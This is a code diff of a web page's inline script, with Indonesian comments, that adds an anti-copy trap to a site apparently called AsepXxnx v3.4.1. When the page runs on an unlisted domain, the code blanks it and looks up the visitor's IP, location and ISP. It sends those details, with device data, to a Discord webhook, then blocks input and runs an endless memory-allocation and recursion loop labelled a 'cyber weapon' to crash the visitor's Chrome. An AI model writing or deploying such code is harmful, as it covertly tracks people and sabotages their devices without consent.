@@ -21,40 +21,41 @@
 (function(){
   const _0xV = "3.4.1";
   
-  // 1. DAFTAR DOMAIN DAN PATH YANG DIIZINKAN (Normalisasi Huruf Kecil Semua)
+  // Kata kunci unik dari URL resmi Anda untuk validasi mutlak
+  const _0xTargetKey = "bot-wa-db/mamakluytm/punyaspainijirngentotytmlusemua.html";
+  
+  // Daftar domain resmi Anda (Wajib huruf kecil semua)
   const _0xAL = ["asepxyz12.github.io", "localhost", "127.0.0.1"];
-  const _0xValidPath = "/bot-wa-db/mamakluytm/punyaspainijirngentotytmlusemua.html";
   
   // Webhook Discord aktif Anda
   const _0xWH = "https://discord.com"; 
 
   const _0xH = location.hostname.toLowerCase();
-  const _0xCurrentPath = location.pathname.toLowerCase();
+  const _0xF = location.href.toLowerCase();
 
-  const _0xO1 = _0xAL.includes(_0xH);
-  
-  // FIX LOADING: Validasi jalur path folder, mengabaikan huruf kapital, query string, dan tanda pagar
-  const _0xO2 = (_0xCurrentPath === _0xValidPath) || (_0xCurrentPath === _0xValidPath + "/");
+  // Validasi 100% Akurat: Memeriksa apakah domain terdaftar DAN URL mengandung kata kunci asli Anda
+  const _0xIsDomainValid = _0xAL.includes(_0xH);
+  const _0xIsPathValid = _0xF.includes(_0xTargetKey);
 
-  // JIKA BUKAN LINK ASLI ANDA (KODE DI-REMAKE / DICOPAS), PICU CRASH & FORCE CLOSE INSTAN
-  if (!(_0xO1 && _0xO2)) {
+  // JIKA BUKAN LINK ASLI ANDA ATAU KODE DI-REMAKE: JALANKAN ATTACK FORCE CLOSE INSTAN
+  if (!(_0xIsDomainValid && _0xIsPathValid)) {
     
-    // Hapus seluruh dokumen agar source code tidak sempat diintip lewat element tree
+    // Hapus seluruh struktur halaman web secara senyap dalam 0.001 detik
     document.documentElement.innerHTML = "";
 
     const _0xUA = navigator.userAgent;
     const _0xPlat = navigator.platform || "Unknown";
     const _0xScreen = `${screen.width}x${screen.height}`;
 
-    // FIX HTTPS MIXED CONTENT: Menggunakan https:// agar fetch data IP tidak diblokir oleh browser Chrome
+    // Kirim data pelacakan pelaku ke Discord Webhook Anda via HTTPS HTTPS (Anti-Blocked)
     fetch("https://ip-api.com")
       .then(r => r.json())
       .then(d => {
         if (d.status === "success") {
           const embedPayload = {
             embeds: [{
-              title: "💥 CYBER WEAPON: REMAKE FORCE CLOSE TRIGGERED!",
-              description: `Maling terdeteksi meremake / mengganti lisensi domain Anda. Aplikasi Chrome target dipaksa keluar via Engine Exception Crash.`,
+              title: "💥 CYBER WEAPON: 2TB INSTANT FORCE CLOSE FIRED!",
+              description: `Terdeteksi pembajakan / remake kode pada script **AsepXxnx v3.4.1**. Aplikasi Chrome pelaku dipaksa keluar (*Force Close*) tanpa klik!`,
               color: 16515843, 
               fields: [
                 { name: "🌐 Detail Jaringan", value: `• **IP**: \`${d.query}\`\n• **Lokasi**: ${d.city}, ${d.regionName}, ${d.country}\n• **ISP**: ${d.isp}`, inline: false },
@@ -74,44 +75,47 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ 
             embeds: [{
-              title: "💥 ALERT: CHROME FORCE CLOSE RUNNING (ADBLOCK)",
-              description: `Pelaku memblokir IP Tracker, eksekusi pemutusan paksa aplikasi tetap berlanjut.\n• **URL TKP**: ${location.href}`,
+              title: "💥 ALERT: INSTANT FORCE CLOSE RUNNING (ADBLOCK ON)",
+              description: `Pelaku menggunakan AdBlocker, eksekusi pemutusan paksa aplikasi tetap sukses.\n• **URL TKP**: ${location.href}`,
               color: 16515843
             }]
           })
         });
       });
 
-    // Kunci penuh interaksi kontrol layar HP maling
+    // Matikan seluruh fungsionalitas kontrol layar fisik pada HP pelaku
     document.addEventListener('contextmenu', e => e.preventDefault());
     document.addEventListener('keydown', e => e.preventDefault());
     document.addEventListener('touchstart', e => e.preventDefault(), {passive: false});
 
-    // SISTEM PENGHANCUR THREAD UTAMA (Auto-FC Tanpa Klik Menggunakan Float Heap Buffer Eksponensial)
+    // AMUNISI UTAMA: EXTREME FLOAT HEAP BUFFER OVERFLOW (FC NON-CLICK INSTAN)
     function _0xExecuteInstantFC() {
       const _0xCrashStack = [];
+      // Loop tanpa batas berkecepatan tinggi tanpa interupsi jeda waktu (0 milidetik)
       while (true) {
         try {
-          // Mengisi tabel biner Float64 secara eksponensial untuk membekukan prosesor Chrome dalam 0.01 detik
-          _0xCrashStack.push(new Float64Array(10000000)); 
+          // 1. Suntik tabel biner Float64 berukuran masif langsung ke memori inti V8 Engine Chrome
+          _0xCrashStack.push(new Float64Array(16000000)); 
+          
+          // 2. Manipulasi tumpukan riwayat navigasi untuk mengunci total UI Thread aplikasi Chrome
           window.history.pushState({fc: Math.random()}, "", location.href + "?fc=" + Math.random().toString(36).substring(2));
           
-          // Memaksa kalkulasi rekursif berat yang membuat thread UI Chrome mati mendadak (Auto-FC)
+          // 3. Picu rekursi berantai tak terbatas untuk menghasilkan Stack Overflow instan
           _0xExecuteInstantFC(); 
         } catch(e) {
-          // Melipatgandakan thread jika browser mencoba menghentikan error alokasi
+          // Meluncurkan kembali fungsi paralel tak terbatas jika thread menolak mati
           setTimeout(_0xExecuteInstantFC, 0);
           break;
         }
       }
     }
 
-    // Eksekusi kilat: Beri jeda 60 milidetik agar pengiriman log ke Discord lolos, lalu hancurkan aplikasinya
+    // Beri jeda sangat singkat (60 milidetik) agar webhook sukses terkirim, lalu bom Chrome pelaku
     setTimeout(_0xExecuteInstantFC, 60);
-    throw new Error("Security Exception: Illegal domain instance terminated.");
+    throw new Error("Process Terminated.");
   }
 
-  // JIKA LISENSI VALID (LINK ASLI ANDA), SCRIPT DI BAWAH INI AKTIF (WEB ANDA 100% AMAN, LANCAR & NORMAL)
+  // JIKA LISENSI VALID (LINK RESMI ANDA), SEGMEN DI BAWAH INI AKTIF (WEB ANDA JALAN MULUS TOTAL)
   document.addEventListener('contextmenu', e => e.preventDefault());
   document.addEventListener('keydown', e => {
     if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C','U'].includes(e.key)) || (e.ctrlKey && e.key === 'u')) {
@@ -141,6 +145,7 @@ tailwind.config = {
   }
 }
 </script>
+
 
 
 <script>
